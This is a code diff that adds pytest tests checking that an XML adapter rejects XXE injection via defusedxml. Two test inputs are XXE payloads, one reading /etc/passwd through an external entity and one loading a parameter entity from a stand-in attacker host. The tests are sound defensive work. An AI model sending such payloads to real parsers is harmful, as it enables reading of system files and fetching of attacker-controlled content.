@@ -186,3 +186,51 @@ class TestXMLAdapterMetadata:
         adapter = XMLAdapter()
         meta = adapter.get_metadata(conn)
         assert "error" in meta
+
+
+class TestXMLAdapterXXEPrevention:
+    """Tests for XXE injection prevention (CPB-1, CWE-611).
+
+    Verifies that defusedxml.expatbuilder.defuse_stdlib() blocks
+    external entity expansion and parameter entity attacks.
+    """
+
+    def test_xxe_entity_rejected(self, conn, xml_file):
+        """XML with external entity declaration is rejected."""
+        xxe_xml = (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE foo ['
+            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">'
+            ']>'
+            '<Root><Item><Name>&xxe;</Name></Item></Root>'
+        )
+        path = xml_file(xxe_xml)
+        adapter = XMLAdapter()
+        with pytest.raises(Exception):
+            adapter.import_data(conn, file_path=path)
+
+    def test_xxe_parameter_entity_rejected(self, conn, xml_file):
+        """XML with parameter entity declaration is rejected."""
+        xxe_xml = (
+            '<?xml version="1.0"?>'
+            '<!DOCTYPE foo ['
+            '  <!ENTITY % pe SYSTEM "http://evil.example.com/payload">'
+            '  %pe;'
+            ']>'
+            '<Root><Item><Name>test</Name></Item></Root>'
+        )
+        path = xml_file(xxe_xml)
+        adapter = XMLAdapter()
+        with pytest.raises(Exception):
+            adapter.import_data(conn, file_path=path)
+
+    def test_safe_xml_still_works(self, conn, xml_file):
+        """Normal XML without entities still imports correctly."""
+        safe_xml = (
+            '<?xml version="1.0"?>'
+            '<Root><Item><Name>Safe</Name><Value>123</Value></Item></Root>'
+        )
+        path = xml_file(safe_xml)
+        adapter = XMLAdapter()
+        result = adapter.import_data(conn, file_path=path)
+        assert result.row_count == 1
